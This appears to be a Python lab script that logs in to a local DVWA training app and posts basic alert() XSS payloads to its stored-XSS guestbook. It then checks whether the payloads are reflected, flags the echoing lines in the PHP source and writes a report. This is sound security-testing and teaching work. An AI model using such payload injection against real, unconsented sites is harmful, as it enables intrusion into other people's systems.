import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
XSS_URL = 'http://localhost/dvwa/vulnerabilities/xss_s/'
REPORT_FILE = '8xsstoreoutput.txt'
DVWA_PATH = r'C:\xampp\htdocs\dvwa\vulnerabilities\xss_s\source\low.php'  # Update this to your actual DVWA installation path

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'admin'

# Replace with your actual session ID
SESSION_ID = '8j076meeafjfigef0e8e91onnn'  # Ensure this is a valid session ID

# Function to perform XSS attack and retrieve data
def perform_xss_attack(session, payload):
    headers = {'Cookie': f'PHPSESSID={SESSION_ID}; security=low'}
    data = {'txtName': payload, 'mtxMessage': payload, 'btnSign': 'Sign Guestbook'}
    response = session.post(XSS_URL, headers=headers, data=data)
    return XSS_URL, response

# Function to login to DVWA
def login_to_dvwa():
    session = requests.Session()
    session.cookies.set('PHPSESSID', SESSION_ID)

    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')

    # Extract CSRF token
    csrf_token_input = soup.find('input', {'name': 'user_token'})
    csrf_token = csrf_token_input['value'] if csrf_token_input else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None

    # Login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }

    response = session.post(LOGIN_URL, data=login_data)

    if 'Login failed' in response.text:
        print('Login failed')
        return None

    return session

# Function to read the vulnerable PHP file and extract vulnerable code
def extract_vulnerable_xss_code(file_path):
    vulnerable_lines = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for i, line in enumerate(lines, start=1):
            if "echo" in line and ("$_POST['mtxMessage']" in line or "$_POST['txtName']" in line):
                vulnerable_lines.append((i, line.strip()))
    return vulnerable_lines

# Function to write report
def write_report(results, vulnerable_code):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA Stored XSS Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for payload, (target_url, response, reflected) in results.items():
            report_file.write(f'Test Payload: {payload}\n')
            report_file.write(f'Target URL: {target_url}\n')
            report_file.write(f'Response Status Code: {response.status_code}\n')

            # Extract a snippet of the response text
            soup = BeautifulSoup(response.text, 'html.parser')
            snippet = soup.prettify()[:500]  # Get the first 500 characters of the prettified HTML
            report_file.write('Response Text Snippet:\n')
            report_file.write(snippet + '\n\n')

            if reflected:
                report_file.write('Vulnerability Detected:\n')
                report_file.write('The stored XSS vulnerability is present because the application stores user input in the database and displays it on the page without proper sanitization.\n')
            else:
                report_file.write('No vulnerability detected.\n')
            report_file.write('='*40 + '\n\n')

        # Append the vulnerable PHP code with line numbers
        report_file.write('Vulnerable PHP Code in PHP File:\n')
        report_file.write('='*40 + '\n')

        for line_number, code_line in vulnerable_code:
            report_file.write(f'Line {line_number}: {code_line}\n')
            report_file.write('Reason: Stored XSS vulnerability. The user input is directly echoed without proper encoding or sanitization.\n')

        report_file.write('='*40 + '\n')

# Main function to run the XSS tests
def run_xss_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\"/><script>alert('XSS')</script>"
    ]

    for payload in payloads:
        print(f'Testing payload: {payload}')
        target_url, response = perform_xss_attack(session, payload)

        # Check if the payload is reflected in the response
        reflected = payload in response.text
        results[payload] = (target_url, response, reflected)

    session.close()

    # Extract vulnerable XSS code from the PHP file
    vulnerable_code = extract_vulnerable_xss_code(DVWA_PATH)

    write_report(results, vulnerable_code)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_xss_tests()